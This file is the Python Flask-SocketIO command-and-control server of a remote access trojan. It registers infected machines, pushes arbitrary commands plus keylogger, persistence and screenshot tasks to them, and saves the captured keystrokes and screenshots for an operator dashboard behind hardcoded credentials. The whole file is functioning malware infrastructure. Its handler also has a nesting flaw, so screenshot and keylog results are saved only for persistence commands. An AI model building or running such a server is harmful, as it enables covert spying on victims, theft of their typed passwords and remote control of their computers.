from flask import *
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app)
app.secret_key = 'Fixer'

USERNAME = 'Leopard'
PASSWORD = 'leopard'
idNum = 0
database = []
completedTasks = []
screenshotNumber = 0
keyloggerNumber = 0

class TaskDone:
    def __init__(self, info):
        self.idNum = info['idNum']
        self.hostname = info['hostname']
        self.commandSent = info['commandSent']
        self.output = info['DATA']

class Client:
    def __init__(self, info):
        global idNum
        self.idNum = idNum
        idNum += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']
        self.status = "Alive"

@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))

@app.route('/login.html', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == USERNAME and password == PASSWORD:
            session['loggedin'] = True
            session['username'] = USERNAME
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')

@app.route('/dashboard.html')
def dashboard():
    if session.get('loggedin'):
        return render_template('dashboard.html', database=database)
    return redirect(url_for('login'))

@app.route('/commands.html', methods=['GET', 'POST'])
def commands():
    if session.get('loggedin'):
        if request.method == 'POST':
            idNumber = request.form.get('idNumber')
            command = request.form.get('command')

            if command in ['keylogger', 'persistence', 'screenshot']:
                communication = {'newTask': command, 'idNum': idNumber}
                socketio.emit('message', communication)
                return render_template('commands.html', commandStatus='Command Sent', taskDb=completedTasks)

            for x in database:
                if str(x.idNum) == str(idNumber):
                    communication = {'newTask': command, 'idNum': x.idNum}
                    socketio.emit('message', communication, room=x.sid)

            return render_template('commands.html', commandStatus='Command Sent', taskDb=completedTasks)
        else:
            return render_template('commands.html', taskDb=completedTasks)
    return redirect(url_for('login'))

@app.route('/logout.html')
def logout():
    session.pop('loggedin', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@socketio.on('connect')
def onConnect():
    pass

@socketio.on('message')
def handleMessage(message):
    command = message.get('COMMAND')
    if command == 'INFO':
        database.append(Client(message))
    elif command == 'OUTPUT':
        if 'persistence' in message['commandSent']:
            if message['PV']:
                for x in database:
                    if x.idNum == message['idNum']:
                        x.persistence = True

            if "screenshot" in message['commandSent']:
                global screenshotNumber
                with open('./static/receivedData/screenshots/' + str(screenshotNumber) + '.png', 'wb') as f:
                    f.write(message['DATA'])
                    tmp = '/static/receivedData/screenshots/' + str(screenshotNumber) + '.png'
                    message['DATA'] = tmp
                    screenshotNumber += 1

            if 'keylogger' in message['commandSent']:
                global keyloggerNumber
                with open('./static/receivedData/keylogs/' + str(keyloggerNumber) + '.txt', 'w') as f:
                    f.write(message['DATA'])
                    tmp = '/static/receivedData/keylogs/' + str(keyloggerNumber) + '.txt'
                    message['DATA'] = tmp
                    keyloggerNumber += 1

            completedTasks.append(TaskDone(message))
    elif command == 'status update':
        for c in database:
            if c.idNum == message['idNum']:
                c.status = "Dead"

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0')
